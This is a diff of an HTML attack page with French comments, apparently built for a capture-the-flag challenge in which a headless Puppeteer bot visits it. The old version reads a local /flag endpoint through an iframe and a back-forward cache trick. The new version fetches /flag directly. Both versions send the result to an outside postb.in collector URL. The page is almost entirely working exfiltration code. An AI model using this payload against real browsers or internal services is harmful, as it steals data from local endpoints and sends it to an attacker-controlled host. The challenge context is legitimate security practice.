@@ -7,31 +7,14 @@
 <script>
   const EXFIL = "https://www.postb.in/1778660481006-3008019395638";
 
-  window.onpageshow = function(event) {
-    if (event.persisted) {
-      // Restauré depuis bfcache - lire l'iframe
-      try {
-        const content = document.getElementById("f").contentDocument.body.innerHTML;
-        fetch(EXFIL + "?flag=" + encodeURIComponent(content));
-      } catch(e) {
-        fetch(EXFIL + "?err=" + encodeURIComponent(e.toString()));
-      }
-    }
-  };
-
-  // Étape 1 : charge /flag dans une iframe
-  // les iframes n'héritent PAS forcément des extraHTTPHeaders de Puppeteer
-  const iframe = document.createElement("iframe");
-  iframe.id = "f";
-  iframe.src = "http://127.0.0.1:5000/flag";
-  document.body.appendChild(iframe);
-
-  // Étape 2 : après chargement, redirige pour mettre en bfcache
-  iframe.onload = function() {
-    setTimeout(() => {
-      window.location = "http://127.0.0.1:5000/flag";
-    }, 500);
-  };
+  fetch("http://127.0.0.1:5000/flag")
+    .then(r => r.text())
+    .then(data => {
+      return fetch(EXFIL + "?flag=" + encodeURIComponent(data));
+    })
+    .catch(e => {
+      fetch(EXFIL + "?err=" + encodeURIComponent(e.toString()));
+    });
 </script>
 </body>
 </html>
